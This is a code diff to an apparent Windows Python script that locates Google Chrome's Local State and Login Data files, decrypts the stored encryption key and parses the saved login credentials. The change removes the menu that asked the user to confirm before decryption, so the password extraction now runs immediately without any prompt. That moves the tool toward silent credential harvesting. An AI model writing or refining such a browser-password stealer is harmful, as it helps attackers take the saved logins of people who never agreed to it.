@@ -87,34 +87,20 @@ def login_data_parser(login_data_path, decryption_key):
         print(f"SQL error: {e}")
         return 1
 
-def display_menu():
-    print("Menu:")
-    print("1. Proceed with decryption")
-    print("2. Quit")
-    return input("Enter your choice: ")
-
 def main():
     if os.name == 'nt':
-        print("\n\n")
 
-        choice = display_menu()
+        if is_chrome_installed():
+            print("Google Chrome is installed.")
+            local_state_path = find_local_state()
+            login_data_path = find_login_data()
 
-        if choice == '1':
-            if is_chrome_installed():
-                print("Google Chrome is installed.")
-                local_state_path = find_local_state()
-                login_data_path = find_login_data()
+            encrypted_key = get_encrypted_key(local_state_path)
+            decryption_key = decrypt_key(encrypted_key)
 
-                encrypted_key = get_encrypted_key(local_state_path)
-                decryption_key = decrypt_key(encrypted_key)
-
-                login_data_parser(login_data_path, decryption_key)
-            else:
-                print("Google Chrome is not installed. Shutting down.")
-        elif choice == '2':
-            print("Exiting the program.")
+            login_data_parser(login_data_path, decryption_key)
         else:
-            print("Invalid choice. Exiting the program.")
+            print("Google Chrome is not installed. Shutting down.")
     else:
         print("This program only runs on Windows systems.")
 
